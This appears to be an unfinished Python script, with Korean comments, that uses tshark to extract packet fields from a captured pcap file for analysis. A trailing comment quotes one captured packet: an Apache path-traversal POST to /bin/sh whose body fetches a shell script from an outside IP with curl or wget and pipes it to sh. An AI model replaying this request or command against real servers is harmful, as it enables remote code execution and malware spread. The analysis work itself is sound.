import subprocess
import json
import csv
import os


tshark_cmd = None
# tshark cmd list
# -i <interface> : 캡처할 네트워크 인터페이스 지정.
# -D : 사용 가능한 네트워크 인터페이스 목록 표시.
# -f <BPF 필터> : 패킷 캡처 시 BPF 필터 적용(TCP/IP 레벨에서 작동).
# -r <file> : 파일로부터 캡처한 데이터를 읽음.
# -w <file> : 패킷 캡처 데이터를 파일로 저장.
# -Y <filter> : 디스플레이 필터 적용(현재 버전).
# -R <filter(old)> : 디스플레이 필터 적용(구버전).
# -T <output format> : 출력 형식 지정(text, fields, json, pdml 중 선택).
# -e <fields> : 특정 필드 값만 출력.
# -V : 패킷 세부정보를 상세히 출력.
# -z <statistics> : 통계 정보 출력(io,stat 또는 http,stat 등).
# -c <packet count> : 캡처할 패킷 수를 제한.   
    
pcap_file = "C:\\apache.pcap"

def user_input(): 
    return

def pcap_frame():
    frame_data = []
    frame_list = [
        "frame.number",
        "frame.time",
        "frame.time_relative",
        "frame.time_epoch",
        "frame.time_delta",
        "frame.len",
        "frame.cap_len",
        "frame.protocols",
        "frame.marked"
        "frame.ignored",
        "frame.interface_id",
        "frame.offset_shift",
        "frame.encap_type",
        "frame.time_delta_displayed",
        "frame.comment"
        # "-e", "frame.pkt_len", --> x
        # "-e", "frame.time_shift",  --> x
        # frame.number : Packet 번호
        # frame.time : 패킷의 캡처 시간
        # frame.time_relative : 첫 번째 패킷과의 상대 시간 --> 패킷이 1개일 경우, 확인x
        # frame.time_epoch : 패킷의 캡처 시간을 Epoch 시간(초)로 출력
        # Epoch 시간 활용
        # 로그와 패킷 캡처 데이터 간의 시간 동기화를 위해 Epoch 시간을 사용.
        # 두 Epoch 시간 간의 차이를 통해 정확한 시간 간격을 계산
        # frame.time_delta : 이전 프레임과의 시간 차이
        # frame.len : 프레임의 전체 길이 (byte 단위)
        # frame.cap_len : 캡처된 프레임 길이 (byte 단위)
        # frame.protocols : 프레임에 포함된 모든 프로토콜 계층
        # frame.marked : 프레임이 Wireshark에서 "Marked"로 표시되었는지 여부
        # frame.ignored : 프레임이 Wireshark에서 "Ignored"로 표시되었는지 여부
        # frame.interface_id : 캡처 인터페이스 ID
        # frame.offset_shift : 프레임 오프셋이 변경된 경우의 Shift 값
        # frame.pkt_len : 프레임의 실제 길이 (Wire Length) --> 사용 불가
        # frame.encap_type : 프레임의  캡슐화(encapsulation) 유형 (Ethernet, PPP 등).
        # frame.time_delta_displayed : 이전 표시된 프레임과의 시간 차이
        # frame.time_shift : 패킷에 적용된 시간 이동 값. --> 사용 불가
        # frame.comment : 프레임에 주석이 있는 경우 그 내용
    ]

    for field in frame_list:
    # read pcap file
        tshark_cmd = [
            "tshark",
            "-r", pcap_file,
            "-T", "fields",
            "-e", field
        ]

        pcap_data = tshark_process(tshark_cmd)
        if pcap_data :
            print(f"{field} : {pcap_data}")
            frame_data.append(pcap_data)
        else:
            print(f"{field} : None")
            frame_data.append("None")

    return frame_data

def pcap_eth():
    eth_data = []
    eth_list = [
        "eth.src",
        "eth.dst",
        "eth.type",
        "eth.addr",
        "eth.len",
        "eth.trailer"
        # eth.src : 출발지 MAC 주소
        # eth.dst : 목적지 MAC 주소
        # eth.type : Ethernet Type 필드 (IPv4, Ipv6, ARP)
        # eth.addr : MAC 주소
        # eth.len : Ethernet 프레임 길이
        # eth.trailer : Ethernet 트레일러 (데이터의 무결성을 확인하거나 추가 정보를 전달)
    ]

    for field in eth_list:
        tshark_cmd = [
            "tshark",
            "-r", pcap_file,
            "-T", "fields",
            "-e", field
        ]

        pcap_data = tshark_process(tshark_cmd)
        if pcap_data :
            print(f"{field} : {pcap_data}")
            eth_data.append(pcap_data)
        else:
            print(f"{field} : None")
            eth_data.append("None")

    return eth_data

def pcap_ipv():
    ip_data = []
    
    # Check Internet Protocol Version
    tshark_cmd = [
        "tshark",
        "-r", pcap_file,
        "-T", "fields",
        "-e", "ip.version"
    ]
    ipv = tshark_process(tshark_cmd)

    if ipv == "4":
        ipv4_list = [
            "ip.src",
            "ip.dst",
            "ip.ttl",
            "ip.proto",
            "ip.len",
            "ip.id",
            "ip.flags",
            "ip.checksum",
            "ip.dsfield"
            # ip.src : 출발지 IP
            # ip.dst : 목적지 IP
            # ip.ttl : Time To Live(TTL)
            # ip.proto : 상위 프로토콜 (TCP, UDP, ICMP)
            # ip.len : IP 패킷의 전체 길이
            # ip.id : 식별자
            # ip.flags : 플래그
            # ip.checksum : 체크섬 (무결성)
            # ip.dsfield : Differentiated Services Field (Qos 관련)
        ]
        
        for field in ipv4_list:
            tshark_cmd = [
                "tshark",
                "-r", pcap_file,
                "-T", "fields",
                "-e", field
            ]

            pcap_data = tshark_process(tshark_cmd)
            if pcap_data:
                print(f"{field} : {pcap_data}")
                ip_data.append(pcap_data)
            else:
                print(f"{field} : None")
                ip_data.append("None")
            
    else:
        ipv6_list = [
            "ipv6.src",
            "ipv6.dst",
            "ipv6.ttl",
            "ipv6.proto",
            "ipv6.len",
            "ipv6.id",
            "ipv6.flags",
            "ipv6.checksum",
            "ipv6.dsfield"
            # ip.src : 출발지 IP
            # ip.dst : 목적지 IP
            # ip.ttl : Time To Live(TTL)
            # ip.proto : 상위 프로토콜 (TCP, UDP, ICMP)
            # ip.len : IP 패킷의 전체 길이
            # ip.id : 식별자
            # ip.flags : 플래그
            # ip.checksum : 체크섬 (무결성)
            # ip.dsfield : Differentiated Services Field (Qos 관련)
        ]

        for field in ipv6_list:
            tshark_cmd = [
                "tshark",
                "-r", pcap_file,
                "-T", "fields",
                "-e", field
            ]
            pcap_data = tshark_process(tshark_cmd)
            if pcap_data:
                print(f"{field} : {pcap_data}")
                ip_data.append(pcap_data)
            else:
                print(f"{field} : None")
                ip_data.append("None")
    return ip_data

def pcap_tl(ip_proto): # Transport Layer 
    tl_data = []
    protocol_list = {
        "1": "ICMP",    # ICMP (Internet Control Message Protocol)	네트워크 오류 보고 및 진단.        
        "6": "TCP",     # TCP (Transmission Control Protocol)	연결 지향적 전송 계층 프로토콜.    
        "17": "UDP",    # UDP (User Datagram Protocol)	연결 비지향적 전송 계층 프로토콜.        
        "41": "IPv6",   # IPv6 encapsulation	IPv6 패킷의 캡슐화를 나타냅니다.        
        "47": "GRE",    # GRE (Generic Routing Encapsulation)	터널링 프로토콜로, 여러 프로토콜을 캡슐화.        
        "50": "ESP",    # ESP (Encapsulating Security Payload)	IPsec에서 사용되는 데이터 암호화 프로토콜.        
        "51": "AH",     # AH (Authentication Header)	IPsec에서 사용되는 인증 헤더.   
        "89": "OSPF",   # OSPF (Open Shortest Path First)	라우팅 프로토콜.        
        "132": "SCTP"   # SCTP (Stream Control Transmission Protocol)	메시지 기반의 신뢰성 있는 전송 프로토콜.        
    }

    ip_proto = protocol_list[ip_proto]

    if ip_proto == "ICMP":
        icmp_list = [
            "icmp.type"	    # ICMP 메시지 타입 (예: Echo Request = 8)
            "icmp.code"	    # ICMP 메시지 코드
            "icmp.checksum"	# ICMP 체크섬
            "icmp.seq"	    # ICMP 시퀀스 번호
            "icmp.id"	    # ICMP 식별자
            "icmp.resp_in"	# 응답을 트리거한 요청 패킷
            "icmp.resp_out" # 요청에 대한 응답 패킷
        ]

        for field in icmp_list:
            tshark_cmd = [
                "tshark",
                "-r", pcap_file,
                "-T", "fields",
                "-e", field
            ]
            pcap_data = tshark_process(tshark_cmd)
            if pcap_data:
                print(f"{field} : {pcap_data}")
                tl_data.append(pcap_data)
            else:
                print(f"{field} : None")
                tl_data.append("None")
        return pcap_data
        
    elif ip_proto == "TCP":
        tcp_list = [
            "tcp.srcport",                  # 출발지 포트                   
            "tcp.dstport",                  # 목적지 포트                  
            "tcp.seq",                      # 시퀀스 번호
            "tcp.ack",                      # ACK 번호
            "tcp.flags",                    # 플래그
            "tcp.flags.syn",                # SYN 플래그
            "tcp.flags.ack",                # ACK 플래그
            "tcp.flags.fin",                # FIN 플래그
            "tcp.flags.reset",              # RST 플래그
            "tcp.flags.push",               # PSH 플래그
            "tcp.flags.urg",                # URG 플래그
            "tcp.len",                      # 페이로드 길이
            "tcp.window_size_value",        # 윈도우 크기 (수신 크기)
            "tcp.options",                  # 옵션
            "tcp.analysis.retransmission",  # 재전송 여부
            "tcp.analysis.lost_segment"     # 세그머트 손실 여부
        ]

        for field in tcp_list:
            tshark_cmd = [
                "tshark",
                "-r", pcap_file,
                "-T", "fields",
                "-e", field
            ]
            pcap_data = tshark_process(tshark_cmd)
            if pcap_data:
                print(f"{field} : {pcap_data}")
                tl_data.append(pcap_data)
            else:
                print(f"{field} : None")
                tl_data.append("None")
        return pcap_data
    
    elif ip_proto == "UDP":
        udp_list = [
            "udp.srcport",      # 
            "udp.dstport",      # 
            "udp.length",       # 
            "udp.checksum"      # 
        ]
        a=3
    elif ip_proto == "IPv6":
        ipv6_list = [
            "ipv6.src",                #      
            "ipv6.dst",                #      
            "ipv6.traffic_class",      #                
            "ipv6.flow_label",         #             
            "ipv6.payload_length",     #                 
            "ipv6.next_header"         #             
        ]
        a=4
    elif ip_proto == "GRE":
        gre_list = [
            "gre.flags",            # 
            "gre.version",          # 
            "gre.protocol"          # 
        ]
        a=5
    elif ip_proto == "ESP":
        esp_list = [
            "esp.spi",
            "esp.sequence",
            "esp.payload",
            "esp.auth_data"
        ]
        a=6
    elif ip_proto == "AH":
        a=7
    elif ip_proto == "OSPF":
        a=8
    elif ip_proto == "SCTP": 
        a=9
        
    
    tshark_cmd = [
        "tshark",
        "-r", pcap_file,
        "-T", "fields"
    ]
    
    return
    

def tshark_process(tshark_cmd):
    pcap_data = subprocess.run(tshark_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # Decode byte string
    decoded_string = pcap_data.stdout.decode('utf-8')
    cleaned_string = decoded_string.strip()
    return cleaned_string

def process_packet():
    return

def process_tshark():
    return

def main():
    # data = process_tshark()
    frame_data = pcap_frame()
    print("--------------------------------------------------------")
    eth_data = pcap_eth()
    print("--------------------------------------------------------")
    ipv_data = pcap_ipv()
    print("--------------------------------------------------------")
    ip_proto = 6
    
    return

if __name__ == "__main__":
    main()



# CompletedProcess(args=['tshark', '-r', 'C:\\apache.pcap', '-V'], returncode=0, stdout=b'

# Frame 1: 428 bytes on wire (3424 bits), 428 bytes captured (3424 bits)\r\n 
#    Encapsulation type: Ethernet (1)\r\n 
#    Arrival Time: Jan 6, 2025 11:43:23.000000000 \xeb\x8c\x80\xed\x95\x9c\xeb\xaf\xbc\xea\xb5\xad \xed\x91\x9c\xec\xa4\x80\xec\x8b\x9c\r\n 
#     UTC Arrival Time: Jan  6, 2025 02:43:23.000000000 UTC\r\n 
#     Epoch Arrival Time: 1736131403.000000000\r\n 
#     [Time shift for this packet: 0.000000000 seconds]\r\n 
#     [Time delta from previous captured frame: 0.000000000 seconds]\r\n 
#     [Time delta from previous displayed frame: 0.000000000 seconds]\r\n 
#     [Time since reference or first frame: 0.000000000 seconds]\r\n 
#     Frame Number: 1\r\n 
#     Frame Length: 428 bytes (3424 bits)\r\n 
#     Capture Length: 428 bytes (3424 bits)\r\n 
#    [Frame is marked: False]\r\n 
#    [Frame is ignored: False]\r\n 
#    [Protocols in frame: eth:ethertype:ip:tcp:http:data-text-lines]\r\n

# Ethernet II, Src: Cisco_27:79:10 (00:26:98:27:79:10), Dst: ExtremeNetwo_52:5d:79 (00:04:96:52:5d:79)\r\n 
#    Destination: ExtremeNetwo_52:5d:79 (00:04:96:52:5d:79)\r\n 
#        .... ..0. .... .... .... .... = LG bit: Globally unique address (factory default)\r\n 
#        .... ...0 .... .... .... .... = IG bit: Individual address (unicast)\r\n 
#    Source: Cisco_27:79:10 (00:26:98:27:79:10)\r\n 
#        .... ..0. .... .... .... .... = LG bit: Globally unique address (factory default)\r\n 
#        .... 
# ...0 .... .... .... .... = IG bit: Individual address (unicast)\r\n 
#    Type: IPv4 (0x0800)\r\n 
#    [Stream index: 0]\r\n

# Internet Protocol Version 4, Src: 43.130.151.76, Dst: 223.63.109.32\r\n 
#    0100 .... = Version: 4\r\n 

# .... 0101 = Header Length: 20 bytes (5)\r\n 
#    Differentiated Services Field: 0x00 (DSCP: CS0, ECN: Not-ECT)\r\n 
#        0000 00.. = Differentiated Services Codepoint: Default (0)\r\n 
#        .... ..00 = Explicit Congestion Notification: Not ECN-Capable Transport (0)\r\n 
#    Total Length: 414\r\n 
#    Identification: 0x93a1 (37793)\r\n 

# 010. .... = Flags: 0x2, Don\'t fragment\r\n 
#        0... .... = Reserved bit: Not set\r\n 
#        .1.. .... = Don\'t fragment: Set\r\n 
#        ..0. .... = More fragments: Not set\r\n 
#    ...0 0000 0000 0000 = Fragment Offset: 0\r\n 
#    Time to Live: 43\r\n 
#    Protocol: TCP (6)\r\n 
#    Header Checksum: 0xab8a [validation disabled]\r\n 
#    [Header checksum status: Unverified]\r\n 
#    Source Address: 43.130.151.76\r\n 
#    Destination Address: 223.63.109.32\r\n 
#    [Stream index: 0]\r\n

# Transmission Control Protocol, Src Port: 48194, Dst Port: 80, Seq: 1, Ack: 1, Len: 
# 362\r\n 
#    Source Port: 48194\r\n 
#    Destination Port: 80\r\n 
#    [Stream index: 0]\r\n 
#    [Conversation completeness: Incomplete (0)]\r\n 
#        ..0. .... = RST: Absent\r\n 
#        ...0 .... = FIN: Absent\r\n 
#        .... 0... = Data: Absent\r\n 
#        .... .0.. = ACK: Absent\r\n 
#        .... ..0. = SYN-ACK: Absent\r\n 
#        .... ...0 = SYN: Absent\r\n 
#        [Completeness Flags: [ Null ]]\r\n 
#    [TCP Segment Len: 362]\r\n 
#    Sequence Number: 1  
#   (relative sequence number)\r\n 
#      Sequence Number (raw): 1451278917\r\n 
#      [Next Sequence Number: 363    (relative sequence number)]\r\n 
#      Acknowledgment Number: 1    (relative ack number)\r\n 
#      Acknowledgment number (raw): 896030014\r\n 
#      1000 .... = Header Length: 32 bytes (8)\r\n 
#      Flags: 0x018 (PSH, ACK)\r\n 
#          000. .... .... = Reserved: Not set\r\n 
#          ...0 .... .... = Accurate ECN: Not set\r\n 
#          .... 0... .... = Congestion Window Reduced: Not set\r\n 
#          .... .0.. .... = ECN-Echo: Not set\r\n 
#          .... ..0. .... = Urgent: Not set\r\n 
#          .... ...1 .... = Acknowledgment: Set\r\n 
#          .... .... 1... = Push: Set\r\n 
#          .... .... 
# .0.. = Reset: Not set\r\n 
#        .... .... ..0. = Syn: Not set\r\n 
#        .... .... ...0 = Fin: Not set\r\n 

#    [TCP Flags: \xc2\xb7\xc2\xb7\xc2\xb7\xc2\xb7\xc2\xb7\xc2\xb7\xc2\xb7AP\xc2\xb7\xc2\xb7\xc2\xb7]\r\n 
#       Window: 502\r\n 
#       [Calculated window size: 502]\r\n 
#       [Window size scaling factor: -1 (unknown)]\r\n 
#       Checksum: 0xa5d5 [unverified]\r\n 
#       [Checksum Status: Unverified]\r\n 
#       Urgent Pointer: 0\r\n 
#       Options: (12 bytes), No-Operation (NOP), No-Operation (NOP), Timestamps\r\n 
#           TCP Option - No-Operation (NOP)\r\n 
#               Kind: No-Operation (1)\r\n 
#           TCP Option - No-Operation (NOP)\r\n 
#               Kind: No-Operation (1)\r\n 
#           TCP 
# Option - Timestamps: TSval 2687415065, TSecr 110697087\r\n 
#            Kind: Time Stamp Option (8)\r\n
#  Length: 10\r\n 
#             Timestamp value: 2687415065\r\n 
#             Timestamp echo reply: 110697087\r\n 
#     [Timestamps]\r\n 
#         [Time since first frame in this TCP stream: 0.000000000 seconds]\r\n 
#         [Time since previous frame in this TCP stream: 0.000000000 seconds]\r\n 
#     [SEQ/ACK analysis]\r\n 
#         [Bytes in flight: 362]\r\n 
#         [Bytes sent since last PSH flag: 362]\r\n 
#     TCP payload (362 bytes)\r\nHypertext Transfer Protocol\r\n 
#     POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1\\r\\n\r\n 
#         Request 
# Method: POST\r\n 
#        Request URI: /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh\r\n 

#   Request Version: HTTP/1.1\r\n 
#      Host: 223.63.109.32:80\\r\\n\r\n 
#      Accept: */*\\r\\n\r\n 
#      Upgrade-Insecure-Requests: 1\\r\\n\r\n 
#      User-Agent: Custom-AsyncHttpClient\\r\\n\r\n 
#      Connection: keep-alive\\r\\n\r\n 
#      Content-Type: text/plain\\r\\n\r\n 
#      Content-Length: 105\\r\\n\r\n 
#          [Content length: 105]\r\n 
#      \\r\\n\r\n 
#      [Full request URI: http://223.63.109.32:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh]\r\n 
#      File Data: 105 bytes\r\nLine-based text data: text/plain (1 lines)\r\n 
#      X=$(curl http://94.156.177.109/sh || wget http://94.156.177.109/sh -O-); echo "$X" | sh -s apache.selfrep\r\n\r\n', stderr=b'')